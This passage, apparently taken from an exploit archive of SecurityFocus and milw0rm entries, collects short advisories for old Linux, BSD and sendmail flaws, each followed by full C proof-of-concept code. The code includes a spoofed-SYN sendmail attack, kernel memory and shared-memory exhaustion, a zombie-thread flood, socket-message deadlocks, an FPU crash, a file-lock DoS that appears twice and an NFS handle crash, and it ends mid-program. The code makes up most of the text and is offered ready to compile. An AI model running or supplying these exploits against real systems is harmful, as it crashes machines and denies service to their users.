  printf("Sending IGMP packet: %s -> %s\n", argv[1], argv[2]);

      if (sendto(s,&buf,sizeof(struct iphdr)+12,0,(struct sockaddr *)&dst,sizeof(struct sockaddr_in)) == -1)
      {
        perror("Error sending packet");
        exit(-1);
      }

  return(0);
}


unsigned short in_chksum(unsigned short *addr, int len)
{
   register int nleft = len;
   register int sum = 0;
   u_short answer = 0;

   while (nleft > 1) {
      sum += *addr++;
      nleft -= 2;
   }


   if (nleft == 1) {
      *(u_char *)(&answer) = *(u_char *)addr;
      sum += answer;
   }


   sum = (sum >> 16) + (sum & 0xffff);
   sum += (sum >> 16);
   answer = ~sum;
   return(answer);
}
source: http://www.securityfocus.com/bid/343/info


It is possible to leak kernel memory and render TCP ports above 1024 unusable, locked forever in the CLOSE_WAIT state in linux kernels prior to the late 2.1.x and 2.2.0pre releases. In addition to being intentionally exploited, unix applications compiled on linux that are multithreaded may also cause these problems.

Below is a harmless example of the exploit:

// This program will kill a random port on a linux machine. The kernel will

// forever listen to that port and send the connections nowhere. Tested with

// Linux kernel 2.0.35 and libc-2.0.7. Requires LinuxThreads to compile,

// but removing LinuxThreads from your system will not solve the problem.

// Discovered by David J. Schwartz <davids@webmaster.com>

// Copyright (C) 1998, David J. Schwartz

// Compile with:

// gcc killport.c -lpthread -o killport

#include <pthread.h>

#include <stdio.h>

#include <sys/types.h>

#include <sys/socket.h>

#include <netinet/in.h>

#include <stdlib.h>

#include <arpa/inet.h>

#include <errno.h>

volatile int s;

void *Thread1(void *a)

{

int i,p;

struct sockaddr_in to;

fd_set fd;

s=socket(AF_INET, SOCK_STREAM, 0);

if(s<=0) return;

memset(&to, 0, sizeof(to));

srand(getpid());

/* we pick a random port between 50000 and 59999 */

p=(rand()%10000)+50000;

printf("port = %d\n", p);

fflush(stdout);

to.sin_port=htons(p);

to.sin_addr.s_addr=0;

to.sin_family=AF_INET;

if(bind(s, (struct sockaddr *)&to, sizeof(to))<0) fprintf(stderr,"no bind\n");

if(listen(s,10)!=0)

fprintf(stderr,"No Listen\n");

/* now we are listening on that port */

i=sizeof(to);

FD_ZERO(&fd);

FD_SET(s,&fd);

select(s+1,&fd,NULL,NULL,NULL);

/* at this point we have selected on it as well */

fprintf(stderr,"select returned!\n");

}

void *Thread2(void *a)

{

close(s);

fflush(stderr);

abort();

}

void main(void)

{

pthread_t j;

pthread_create(&j,NULL,Thread1,NULL);

usleep(100); /* give the other thread time to finish */

pthread_create(&j,NULL,Thread2,NULL);

while(1) sleep(1);

} source: http://www.securityfocus.com/bid/363/info

The 2.0.x kernels have a quirk in the TCP implementation that have to do with the accept() call returning after only a syn has been recieved (as opposed to the three way handshake having been completed). Sendmail, which is compiled on many unices, makes the assumption that the three way handshake has been completed and a tcp connection has been fully established. This trust in a standard tcp implementation is seen in the following section of code <src/daemon.c>:

t = accept(DaemonSocket,

(struct sockaddr *)&RealHostAddr, &lotherend);

if (t >= 0 || errno != EINTR)

break;

}

savederrno = errno;

(void) blocksignal(SIGALRM);

if (t < 0)

{ errno = savederrno;

syserr("getrequests: accept");

/* arrange to re-open the socket next time around */

(void) close(DaemonSocket);

DaemonSocket = -1;

refusingconnections = TRUE;

sleep(5);

continue;

}

It's possible to cause a denial of service here if a RST is sent after the initial SYN to the sendmail smtpd on port 25. If that were to be done, the sendmail smtpd would be caught in a loop (above) accepting, testing the socket [yes, the one which accept returned on listening on port 25], sleeping, and closing the socket for as long as the syns and following rsts are sent. It is also completely possible to do this with spoofed packets. 


/*

* smad.c - sendmail accept dos -

*

* Salvatore Sanfilippo [AntireZ]

* Intesis SECURITY LAB Phone: +39-2-671563.1

* Via Settembrini, 35 Fax: +39-2-66981953

* I-20124 Milano ITALY Email: antirez@seclab.com

* md5330@mclink.it

*

* compile it under Linux with gcc -Wall -o smad smad.c

*

* usage: smad fakeaddr victim [port]

*/

#include <unistd.h>

#include <string.h>

#include <stdio.h>

#include <stdlib.h>

#include <arpa/inet.h>

#include <sys/types.h>

#include <sys/socket.h>

#include <netinet/tcp.h>

#include <netinet/ip.h>

#include <netinet/in.h>

#include <netdb.h>

#include <unistd.h>

#define SLEEP_UTIME 100000 /* modify it if necessary */

#define PACKETSIZE (sizeof(struct iphdr) + sizeof(struct tcphdr))

#define OFFSETTCP (sizeof(struct iphdr))

#define OFFSETIP (0)

u_short cksum(u_short *buf, int nwords)

{

unsigned long sum;

u_short *w = buf;

for (sum = 0; nwords > 0; nwords-=2)

sum += *w++;

sum = (sum >> 16) + (sum & 0xffff);

sum += (sum >> 16);

return ~sum;

}

void resolver (struct sockaddr * addr, char *hostname, u_short port)

{

struct sockaddr_in *address;

struct hostent *host;

address = (struct sockaddr_in *)addr;

(void) bzero((char *)address, sizeof(struct sockaddr_in));

address->sin_family = AF_INET;

address->sin_port = htons(port);

address->sin_addr.s_addr = inet_addr(hostname);

if ( (int)address->sin_addr.s_addr == -1) {

host = gethostbyname(hostname);

if (host) {

bcopy( host->h_addr,

(char *)&address->sin_addr,host->h_length);

} else {

perror("Could not resolve address");

exit(-1);

}


}

}

int main(int argc, char **argv)

{

char runchar[] = "|/-\\";

char packet[PACKETSIZE],

*fromhost,

*tohost;

u_short fromport = 3000,

toport = 25;

struct sockaddr_in local, remote;

struct iphdr *ip = (struct iphdr*) (packet + OFFSETIP);

struct tcphdr *tcp = (struct tcphdr*) (packet + OFFSETTCP);

struct tcp_pseudohdr

{

struct in_addr saddr;

struct in_addr daddr;

u_char zero;

u_char protocol;

u_short lenght;

struct tcphdr tcpheader;

}

pseudoheader;

int sock, result, runcharid = 0;

if (argc < 3)

{

printf("usage: %s fakeaddr victim [port]\n", argv[0]);

exit(0);

}

if (argc == 4)

toport = atoi(argv[3]);

bzero((void*)packet, PACKETSIZE);

fromhost = argv[1];

tohost = argv[2];

resolver((struct sockaddr*)&local, fromhost, fromport);

resolver((struct sockaddr*)&remote, tohost, toport);

sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

if (sock == -1) {

perror("can't get raw socket");

exit(1);

}

/* src addr */

bcopy((char*)&local.sin_addr, &ip->saddr,sizeof(ip->saddr));

/* dst addr */

bcopy((char*)&remote.sin_addr,&ip->daddr,sizeof(ip->daddr));

ip->version = 4;

ip->ihl = sizeof(struct iphdr)/4;

ip->tos = 0;

ip->tot_len = htons(PACKETSIZE);

ip->id = htons(getpid() & 255);

/* no flags */

ip->frag_off = 0;

ip->ttl = 64;

ip->protocol = 6;

ip->check = 0;

tcp->th_dport = htons(toport);

tcp->th_sport = htons(fromport);

tcp->th_seq = htonl(32089744);

tcp->th_ack = htonl(0);

tcp->th_off = sizeof(struct tcphdr)/4;

/* 6 bit reserved */

tcp->th_flags = TH_SYN;

tcp->th_win = htons(512);

/* start of pseudo header stuff */

bzero(&pseudoheader, 12+sizeof(struct tcphdr));

pseudoheader.saddr.s_addr=local.sin_addr.s_addr;

pseudoheader.daddr.s_addr=remote.sin_addr.s_addr;

pseudoheader.protocol = 6;

pseudoheader.lenght = htons(sizeof(struct tcphdr));

bcopy((char*) tcp, (char*) &pseudoheader.tcpheader,

sizeof(struct tcphdr));

/* end */

tcp->th_sum = cksum((u_short *) &pseudoheader,

12+sizeof(struct tcphdr));

/* 16 bit urg */

while (0)

{

result = sendto(sock, packet, PACKETSIZE, 0,

(struct sockaddr *)&remote, sizeof(remote));

if (result != PACKETSIZE)

{

perror("sending packet");

exit(0);

} printf("\b");

printf("%c", runchar[runcharid]);

fflush(stdout);

runcharid++;

if (runcharid == 4)

runcharid = 0;

usleep(SLEEP_UTIME);

}

return 0;

} source: http://www.securityfocus.com/bid/6420/info

A denial of service vulnerability has been discovered in the Linux 2.2 kernel. It has been reported that it is possible for an unprivileged user to cause the kernel to stop responding due to a bug in the implementation of mmap().

It should be noted that this issue does not affect the 2.4 kernel tree. This is because support for mmap() in the /proc/pid/mem implementation has been dropped. 

   #define PAGES 10

   #include <asm/page.h>
   #include <sys/mman.h>
   #include <unistd.h>
   #include <stdio.h>
   #include <fcntl.h>
   #include <sys/ptrace.h>

   int main() {
     int ad1,ad2,zer,mem,pid,i;
     zer=open("/dev/zero",O_RDONLY);
     ad1=(int)mmap(0,PAGES*PAGE_SIZE,0,MAP_PRIVATE,zer,0);
     pid=getpid();
     if (!fork()) {
       char p[64];
       ptrace(PTRACE_ATTACH,pid,0,0);
       sleep(1);
       sprintf(p,"/proc/%d/mem",pid);
       mem=open(p,O_RDONLY);
       ad2=(int)mmap(0,PAGES*PAGE_SIZE,PROT_READ,MAP_PRIVATE,mem,ad1);
       write(1,(char*)ad2,PAGES*PAGE_SIZE);
     }
     sleep(100);
     return 0;
   }
source: http://www.securityfocus.com/bid/1072/info

A denial of service exists in Linux kernels, as related to Unix domain sockets ignoring limits as set in /proc/sys/net/core/wmem_max. By creating successive Unix domain sockets, it is possible to cause a denial of service in some versions of the Linux kernel. Versions 2.2.12, 2.2.14, and 2.3.99-pre2 have all been confirmed as being vulnerable. Previous kernel versions are most likely vulnerable. 

#include <sys/types.h>
#include <sys/socket.h>
#include <string.h>

char buf[128 * 1024];

int main ( int argc, char **argv )
{
struct sockaddr SyslogAddr;
int LogFile;
int bufsize = sizeof(buf)-5;
int i;

for ( i = 0; i < bufsize; i++ )
buf[i] = ' '+(i%95);
buf[i] = '\0';

SyslogAddr.sa_family = AF_UNIX;
strncpy ( SyslogAddr.sa_data, "/dev/log", sizeof(SyslogAddr.sa_data) );
LogFile = socket ( AF_UNIX, SOCK_DGRAM, 0 );
sendto ( LogFile, buf, bufsize, 0, &SyslogAddr, sizeof(SyslogAddr) );
return 0;
} source: http://www.securityfocus.com/bid/526/info

Operating systems with a shared memory implementation based on or influenced by the 4.4BSD code may be vulnerable to a denial of service attack The problem exists because you can mmap() or shmget() as much memory as you'd like bypassing rlimits. When you trigger pagefaults, the system will begin allocating the memory (it's not actually allocated at first) and run out. With System V IPC the memory remains allocated even after the process has stopped running.

/*
 * This program can be used to exploit DoS bugs in the VM systems or utility
 * sets of certain OS's.
 *
 * Common problems:
 * 1. The system does not check rlimits for mmap and shmget (FreeBSD)
 * 2. The system never bothers to offer the ability to set the rlimits for
 *    virtual memory via shells, login process, or otherwise. (Linux)
 * 3. b. The system does not actually allocate shared memory until a page fault
 *       is triggered (this could be argued to be a feature - Linux, *BSD)
 *    a. The system does not watch to make sure you don't share more memory 
 *       than exists. (Linux, Irix, BSD?)
 * 4. With System V IPC, shared memory persists even after the process is
 *    gone. So even though the kernel may kill the process after it exhausts all
 *    memory from page faults, there still is 0 memory left for the system.
 *    (All)
 *
 * This program should compile on any architecture. SGI Irix is not
 * vulnerable. From reading The Design and Implementation of 4.4BSD it sounds
 * as if the BSDs should all be vulnerable. FreeBSD will mmap as much memory
 * as you tell it. I haven't tried page faulting the memory, as the system is
 * not mine. I'd be very interested to hear about OpenBSD...
 *
 * This program is provided for vulnerability evaluation ONLY. DoS's aren't
 * cool, funny, or anything else. Don't use this on a machine that isn't
 * yours!!!
 */
#include <stdio.h>
#include <errno.h>
#include <sys/ipc.h>
#include <sys/shm.h> /* redefinition of LBA.. PAGE_SIZE in both cases.. */
#ifdef __linux__
#include <asm/shmparam.h>
#include <asm/page.h>
#endif
#include <sys/types.h>
#include <stdio.h>
#include <sys/stat.h>
#include <sys/fcntl.h>
#include <sys/mman.h>

int len;

#define __FUXX0R_MMAP__

/* mmap also implements the copy-on-fault mechanism, but because the only way
 * to easily exploit this is to use anonymous mappings, once the kernel kills
 * the offending process, you can recover. (Although swap death may still
 * occurr */
/* #define __FUXX0R_MMAP__ */

/* Most mallocs use mmap to allocate large regions of memory. */
/* #define __FUXX0R_MMAP_MALLOC__ */


/* Guess what this option does :) */
#define __REALLY_FUXX0R__  

/* From glibc 2.1.1 malloc/malloc.c */
#define DEFAULT_MMAP_THRESHOLD (128 * 1024) 

#ifndef PAGE_SIZE
# define PAGE_SIZE 4096
#endif

#ifndef SHMSEG
# define SHMSEG 256
#endif

#if defined(__FUXX0R_MMAP_MALLOC__)
void *mymalloc(int n)
{
    if(n <= DEFAULT_MMAP_THRESHOLD)
	n = DEFAULT_MMAP_THRESHOLD + 1;
    return malloc(n);
}

void myfree(void *buf)
{
    free(buf);
}
#elif defined(__FUXX0R_MMAP__)
void *mymalloc(int n)
{
    int fd;
    void *ret;
    fd = open("/dev/zero", O_RDWR);
    ret = mmap(0, n, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
    close(fd);
    return (ret == (void *)-1 ? NULL : ret);
}
void myfree(void *buf)
{
    munmap(buf, len);
}

#elif defined(__FUXX0R_SYSV__)
void *mymalloc(int n)
{
    char *buf;
    static int i = 0;
    int shmid;
    i++; /* 0 is IPC_PRIVATE */
    if((shmid = shmget(i, n, IPC_CREAT | SHM_R | SHM_W)) == -1)
    {
#if defined(__irix__)
    	if (shmctl (shmid, IPC_RMID, NULL))
	{
	    perror("shmctl");
	}
#endif
	
	return NULL;	
    }
    if((buf = shmat(shmid, 0, 0)) == (char *)-1)
    {
#if defined(__irix__)
    	if (shmctl (shmid, IPC_RMID, NULL))
	{
	    perror("shmctl");
	}
#endif
	return NULL;
    }

#ifndef __REALLY_FUXX0R__
    if (shmctl (shmid, IPC_RMID, NULL))
    {
	perror("shmctl");
    }
#endif

    return buf;
}

void myfree(void *buf)
{
    shmdt(buf);
}
#endif

#ifdef __linux__
void cleanSysV()
{
    struct shmid_ds shmid;
    struct shm_info shm_info;
    int id;
    int maxid;
    int ret;
    int shid;
    maxid = shmctl (0, SHM_INFO, (struct shmid_ds *) &shm_info);
    printf("maxid %d\n", maxid);
    for (id = 0; id <= maxid; id++) 
    {
	if((shid = shmctl (id, SHM_STAT, &shmid)) < 0)
	    continue;

	if (shmctl (shid, IPC_RMID, NULL))
	{
	    perror("shmctl");
	}
	printf("id %d has %d attachments\n", shid, shmid.shm_nattch);
	shmid.shm_nattch = 0;
	shmctl(shid, IPC_SET, &shmid);
	if(shmctl(shid, SHM_STAT, &shmid) < 0)
	{
	    printf("id %d deleted sucessfully\n", shid);
	}
	else if(shmid.shm_nattch == 0)
	{
	    printf("Still able to stat id %d, but has no attachments\n", shid);
	}
	else
	{
	    printf("Error, failed to remove id %d!\n", shid);
	}	

    }
}
#endif

int main(int argc, char **argv)
{
    int shmid;
    int i = 0;
    char *buf[SHMSEG * 2];
    int max;
    int offset;
    if(argc < 2)
    {
	printf("Usage: %s <[0x]size of segments>\n", argv[0]);
#ifdef __linux__
	printf("    or %s --clean (destroys all of IPC space you have permissions to)\n", argv[0]);
#endif
	exit(0);
    }

#ifdef __linux__
    if(!strcmp(argv[1], "--clean"))
    {
	cleanSysV();
	exit(0);
    }
#endif 
    
    len = strtol(argv[1], NULL, 0);
    for(buf[i] = mymalloc(len); i < SHMSEG * 2 && buf[i] != NULL; buf[++i] = mymalloc(len))
	;

    max = i;
    perror("Stopped because");
    printf("Maxed out at %d %d byte segments\n", max, len);
#if defined(__FUXX0R_SYSV__) && defined(SHMMNI)
    printf("Despite an alleged max of %d (%d per proc) %d byte segs. (Page "
	    "size: %d), \n", SHMMNI, SHMSEG, SHMMAX,  PAGE_SIZE); 
#endif
    
#ifdef __REALLY_FUXX0R__
    fprintf(stderr, "Page faulting alloced region... Have a nice life!\n");
    for(i = 0; i < max; i++)
    {
	for(offset = 0; offset < len; offset += PAGE_SIZE)
	{
	    buf[i][offset] = '*';
	}
	printf("wrote to %d byes of memory, final offset %d\n", len, offset);
    }
    // never reached :(
#else
    for(i = 0; i <= max; i++)
    {
	myfree(buf[i]);
    }
#endif
    exit(42);
}

source: http://www.securityfocus.com/bid/10096/info

A vulnerability has been reported in the Linux Kernel that may permit a malicious local user to affect a system-wide denial of service condition. This issue may be triggered via the Kernel signal queue (struct sigqueue) and may be exploited to exhaust the system process table by causing an excessive number of threads to be left in a zombie state.

#include <signal.h>
#include <unistd.h>
#include <stdlib.h>
 
int main()
{
	sigset_t set;
	int i;
	pid_t pid;

	sigemptyset(&set);
	sigaddset(&set, 40);
	sigprocmask(SIG_BLOCK, &set, 0);

	pid = getpid();
	for (i = 0; i < 1024; i++)
		kill(pid, 40);

	while (1)
		sleep(1);
}
 /*
  Linux 2.4.20 knfsd kernel signed/unsigned decode_fh DoS
  Author: jared stanbrough <jareds pdx edu> 
  
  Vulnerable code: (fs/nfsd/nfs3xdr.c line 52-64)

  static inline u32 *
  decode_fh(u32 *p, struct svc_fh *fhp)
  {
        int size;
        fh_init(fhp, NFS3_FHSIZE);
        size = ntohl(*p++);
        if (size > NFS3_FHSIZE)
                return NULL;   

        memcpy(&fhp->fh_handle.fh_base, p, size);
        fhp->fh_handle.fh_size = size;
        return p + XDR_QUADLEN(size);
  }

  This code is called by quite a few XDR decoding routines. The below
  POC demonstrates the vulnerability by encoding a malicious fhsize
  at the beginning of a diroparg xdr argument. 
 
  To test this, the vulnerable host must have an accessible exported
  directory which was previously mounted by the attacker. _HOWEVER_ 
  it may be possible to trigger this bug by some other method.

  Fix: Simply change size to an unsigned int, or check for size < 0.
*/

#include <rpcsvc/nfs_prot.h>
#include <rpc/rpc.h>
#include <rpc/xdr.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/types.h>

#define NFSPROG 100003
#define NFSVERS 3
#define NFSPROC_GETATTR 1

static struct diropargs heh;

bool_t xdr_heh(XDR *xdrs, diropargs *heh) 
{
  int32_t werd = -1; 
  return xdr_int32_t(xdrs, &werd);
}

int main(void)
{
  CLIENT * client;
  struct timeval tv;

  client = clnt_create("marduk", NFSPROG, NFSVERS, "udp");
  
  if(client == NULL) {
      perror("clnt_create\n");
  }

  tv.tv_sec = 3;
  tv.tv_usec = 0;
  client->cl_auth = authunix_create_default();

  clnt_call(client, NFSPROC_GETATTR, (xdrproc_t) xdr_heh, (char *)&heh,
            (xdrproc_t) xdr_void, NULL, tv);

  return 0;
}

// milw0rm.com [2003-07-29]
/* memory leak
 * Copyright Georgi Guninski
 * Cannot be used in vulnerability databases (like securityfocus and mitre)
 * */
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <ctype.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(int ac,char **av)
{
struct msghdr msghdr;
struct iovec iovector[10];
int i,s,j,ma;
struct sockaddr_in sockad; 
char msg[128];
struct cmsghdr *cmsg,*cm2; 
char opts[24];

ma=250;
printf("just wait and watch memory usage\n");

memset(opts,0,sizeof(opts));

while(42)
{
s=socket(PF_INET, /*SOCK_STREAM*/ SOCK_DGRAM, 0);
sockad.sin_family = AF_INET;
sockad.sin_addr.s_addr=inet_addr("127.0.0.1");
sockad.sin_port=htons(8080); 

connect(s,(struct sockaddr *) &sockad, sizeof(sockad)); 

memset(msg,'v',sizeof(msg));
#define VV (ma*(sizeof(struct cmsghdr)+sizeof(opts))+1024*1024)
cmsg = malloc(VV);
memset(cmsg,0,VV);
cmsg->cmsg_len = sizeof(struct cmsghdr) + sizeof(opts);
cmsg->cmsg_level = SOL_IP;
cmsg->cmsg_type = IP_RETOPTS;
memcpy(CMSG_DATA(cmsg), opts, sizeof(opts));

cm2= (struct cmsghdr *) (long) ((char *)CMSG_DATA(cmsg)+sizeof(opts));
for(j=0;j<ma;j++)
{
cm2->cmsg_level = SOL_IP;
cm2->cmsg_type = IP_RETOPTS;
cm2->cmsg_len =  sizeof(struct cmsghdr) + sizeof(opts); 
cm2= (struct cmsghdr *) (long) ((char *)CMSG_DATA(cm2)+sizeof(opts));
}

cm2->cmsg_level = SOL_IP;
cm2->cmsg_type = IP_RETOPTS;
cm2->cmsg_len =  sizeof(struct cmsghdr) + 8; 

msghdr.msg_name = &sockad;
msghdr.msg_namelen = sizeof(sockad);

msghdr.msg_control=cmsg;
msghdr.msg_controllen= cmsg->cmsg_len + (j)*cmsg->cmsg_len+cm2->cmsg_len;  
msghdr.msg_iov = iovector;

msghdr.msg_iovlen = 1;
iovector[0].iov_base = msg;
iovector[0].iov_len = sizeof(msg);

if ((i = sendmsg(s, &msghdr, 0)) < 0)
{perror("sendmsg");return -42;}

close(s);
free(cmsg);
}
return 42;
}

// milw0rm.com [2004-12-16]
/*
*      Linux kernel 2.4 & 2.6 __scm_send DoS
*      Warning! this code will hang your machine
*
*      gcc -O2 scmbang.c -o scmbang
*
*      Copyright (c) 2004  iSEC Security Research. All Rights Reserved.
*
*      THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS"
*      AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
*      WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
*
*/

#define _GNU_SOURCE
#include <stdio.h>
#include <errno.h>
#include <sys/socket.h>
#include <arpa/inet.h>

static char buf[1024];

void
fatal (const char *msg)
{
   printf ("\n");
   if (!errno)
     {
         fprintf (stderr, "FATAL: %s\n", msg);
     }
   else
     {
         perror (msg);
     }
   printf ("\n");
   fflush (stdout);
   fflush (stderr);
   exit (1);
}

int
main (void)
{
   int s[2], r;
   struct sockaddr_in sin;
   struct msghdr *msg;
   struct cmsghdr *cmsg;

   r = socketpair (AF_UNIX, SOCK_DGRAM, 0, s);
   if (r < 0)
       fatal ("socketpair");

   memset (buf, 0, sizeof (buf));
   msg = (void *) buf;
   msg->msg_control = (void *) (msg + 1);

// make bad cmsgs
   cmsg = (void *) msg->msg_control;

   cmsg->cmsg_len = sizeof (*cmsg);
   cmsg->cmsg_level = 0xdeadbebe;
   cmsg->cmsg_type = 12;       // len after overflow on second msg
   cmsg++;

// -12 for deadlock
   cmsg->cmsg_len = -12;
   cmsg->cmsg_level = SOL_IP;
   msg->msg_controllen = (unsigned) (cmsg + 1) - (unsigned) msg->msg_control;
   r = sendmsg (s[0], msg, 0);
   if (r < 0)
       fatal ("sendmsg");

   printf ("\nYou lucky\n");
   fflush (stdout);

   return 0;
}

// milw0rm.com [2004-12-14]
/* -----------------------------------------------------------------------------
 * frstor Local Kernel exploit
 * Crashes any kernel from 2.4.18
 * to 2.6.7 because frstor in assembler inline offsets in memory by 4.
 * Original proof of concept code
 * by stian_@_nixia.no.
 * Added some stuff by lorenzo_@_gnu.org
 * and fixed the fsave line with (*fpubuf).
 * -----------------------------------------------------------------------------
 */

/*
-----------------------------------------
Some debugging information made
available by stian_@_nixia.no
-----------------------------------------
TakeDown:
        pushl   %ebp
        movl    %esp, %ebp
        subl    $136, %esp
        leal    -120(%ebp), %eax
        movl    %eax, -124(%ebp)
#APP
        fsave -124(%ebp)

#NO_APP
        subl    $4, %esp
        pushl   $1
        pushl   $.LC0
        pushl   $2
        call    write
        addl    $16, %esp
        leal    -120(%ebp), %eax
        movl    %eax, -128(%ebp)
#APP
        frstor -128(%ebp)

#NO_APP
        leave
        ret
*/

#include <sys/time.h>
#include <signal.h>
#include <unistd.h>

static void TakeDown(int ignore)
{
 char fpubuf[108];
// __asm__ __volatile__ ("fsave %0\n" : : "m"(fpubuf));
__asm__ __volatile__ ("fsave %0\n" : : "m"(*fpubuf)); 
 write(2, "*", 1);
 __asm__ __volatile__ ("frstor %0\n" : : "m"(fpubuf));
}

int main(int argc, char *argv[])
{
 struct itimerval spec;
 signal(SIGALRM, TakeDown);
 spec.it_interval.tv_sec=0;
 spec.it_interval.tv_usec=100;
 spec.it_value.tv_sec=0;
 spec.it_value.tv_usec=100;
 setitimer(ITIMER_REAL, &spec, NULL);
 while(1)
  write(1, ".", 1);

 return 0;
}
// <<EOF


// milw0rm.com [2004-06-25]
source: http://www.securityfocus.com/bid/12949/info

A local denial of service vulnerability reportedly affects the Linux kernel. This issue arises due to a failure of the kernel to properly handle malicious, excessive file locks.

An attacker may leverage this issue to crash or hang the affected kernel and deny service to legitimate users.

It should be noted that Symantec has been unable to reproduce this issue after testing. It is possible that this vulnerability is linked to the reporter's specific configuration. More information will be added as it becomes available. 

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/file.h>
#include <syscall.h>
#include <errno.h>

#define SIZE 0x80004242

_syscall5(int, _llseek, uint, fd, ulong, hi, ulong, lo, loff_t *, res, uint, wh);

void createfile(){
int nm1, filev;
char vname[424];

for(nm1=0;nm1<920;nm1++){
snprintf(vname, sizeof(vname), "UNLOCKRESEARCHTEAM%d.%d", getpid(), nm1);
filev = open(vname, O_CREAT|O_RDWR, S_IRWXU);
if(filev < 0){
printf("ERROR\n");
perror("open()");
}
if(flock(filev,LOCK_EX) == -1){
printf("ERROR\n");
perror("flock()");
}
}
while(42);
}

int main(int argc, char *argv[]){
int count, fd, i, fv;
void *mv;
char *buf1, *buf2;
loff_t lr;
int nm1;

printf("\t\tkernel-2.6.10 DoS by ChoiX [Unl0ck Team]\n");
printf("[--]create files(it can take a few minutes)...");
nm1 = 5;
while(count--){
if(!fork()){
createfile();
}
}
sleep(100);

printf("OK\n");

printf("[--]start exploiting...");

system("sync");
fd=open("/proc/locks", O_RDONLY);
if(fd < 0){
printf("ERROR\n");
perror("open()");
}
buf1 = malloc(1024*1024*8);
buf2 = malloc(1024*1024*8);

if(_llseek(fd,42,SIZE,&lr,SEEK_SET) == -1){
printf("ERROR\n");
printf("llseek()");
}
i=read(fd,buf2, SIZE);
perror("read");
printf("read=%d mv=%x fv=%x\n %.300s",i,(int)mv,fv,buf2);
while(42);
return 42;
}/* Removed ='s at the bottom /str0ke */

/*
 * linux kernel <=2.6.10(2.6.x) DOS exploit
 * writen by ChoiX
 * (c) uKt Research
 * [www.unl0ck.org][info@unl0ck.org]
 */

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/file.h>
#include <syscall.h>
#include <errno.h>

#define SIZE 0x80004242

_syscall5(int, _llseek, uint, fd, ulong, hi, ulong, lo, loff_t *, res, uint, wh);

void createfile(){
int nm1, filev;
char vname[424];

for(nm1=0;nm1<920;nm1++){
	snprintf(vname, sizeof(vname), "UNLOCKRESEARCHTEAM%d.%d", getpid(), nm1);
	filev = open(vname, O_CREAT|O_RDWR, S_IRWXU);
	if(filev < 0){
		printf("ERROR\n");
		perror("open()");
	}
	if(flock(filev,LOCK_EX) == -1){
		printf("ERROR\n");
		perror("flock()");
	}
}
while(42);
}

int main(int argc, char *argv[]){
int count, fd, i, fv;
void *mv;
char *buf1, *buf2;
loff_t lr;
int nm1;

printf("\t\tkernel-2.6.10 DoS by ChoiX [Unl0ck Team]\n");
printf("[--]create files(it can take a few minutes)...");
nm1 = 5;
while(count--){
	if(!fork()){
		createfile();
	}
}
sleep(100);

printf("OK\n");

printf("[--]start exploiting...");

system("sync");
fd=open("/proc/locks", O_RDONLY);
if(fd < 0){
	printf("ERROR\n");
	perror("open()");
}
buf1 = malloc(1024*1024*8);
buf2 = malloc(1024*1024*8);

if(_llseek(fd,42,SIZE,&lr,SEEK_SET) == -1){
	printf("ERROR\n");
	printf("llseek()");
}
i=read(fd,buf2, SIZE);
perror("read");
printf("read=%d mv=%x fv=%x\n %.300s",i,(int)mv,fv,buf2);
while(42);
return 42;
}

// milw0rm.com [2005-03-29]
/* pktcdvd_dos.c proof-of-concept 
* This is only a lame POC which will crash the machine, no root shell here. 
* --- alert7 
* 2005-5-15 
* the vulnerability in 2.6 up to and including 2.6.12-rc4 
* 
* gcc -o pktcdvd_dos pktcdvd_dos.c 
* 
* NOTE: require user can read pktcdvd block device 


* THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS" 
* AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION 
* WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED. 
*/ 


#define _GNU_SOURCE 
#include <stdio.h> 
#include <stdlib.h> 
#include <errno.h> 
#include <string.h> 
#include <unistd.h> 
#include <fcntl.h> 
#include <signal.h> 
#include <paths.h> 
#include <grp.h> 
#include <setjmp.h> 
#include <stdint.h> 
#include <sys/mman.h> 
#include <sys/ipc.h> 
#include <sys/shm.h> 
#include <sys/ucontext.h> 
#include <sys/wait.h> 
#include <asm/ldt.h> 
#include <asm/page.h> 
#include <asm/segment.h> 
#include <linux/unistd.h> 
#include <linux/linkage.h> 
#include <sys/types.h> 
#include <sys/stat.h> 
#include <fcntl.h> 
#include <linux/sysctl.h> 
#include <linux/cdrom.h> 


#define __NR_sys_ioctl __NR_ioctl 



#define PKTCDVDDEVICE "/dev/hdc" 


static inline _syscall3(int, sys_ioctl, int ,fd,int, cmd,unsigned long, arg); 


struct idtr { 
unsigned short limit; 
unsigned int base; 
} __attribute__ ((packed)); 


unsigned int get_addr_idt() { 
struct idtr idtr; 
asm("sidt %0" : "=m" (idtr)); 
return idtr.base; 
} 
struct desc_struct { 
unsigned long a,b; 
}; 
int main(int argc,char **argv) 
{ 
unsigned int ptr_idt; 
int iret ; 
int fd; 


printf("[++]user stack addr %p \n",&ptr_idt); 
if ( ( (unsigned long )&ptr_idt >>24)==0xfe){ 
printf("[--]this kernel patched 4g/4g patch,no vulnerability!\n"); 
return -1; 
} 


ptr_idt=get_addr_idt(); 
printf("[++]IDT Addr %p \n",ptr_idt); 



fd = open(PKTCDVDDEVICE,O_RDONLY); 
if (fd ==-1) 
{ 
printf("[--]"); 
fflush(stdout); 
perror("open"); 
return -1; 
} 

unsigned long WriteTo ; 


if ( (ptr_idt>>24)==0xc0){ 
printf("[++]this OS in Real Linux\n"); 
WriteTo= ptr_idt; 
}else{ 
printf("[++]this OS maybe in VMWARE\n"); 
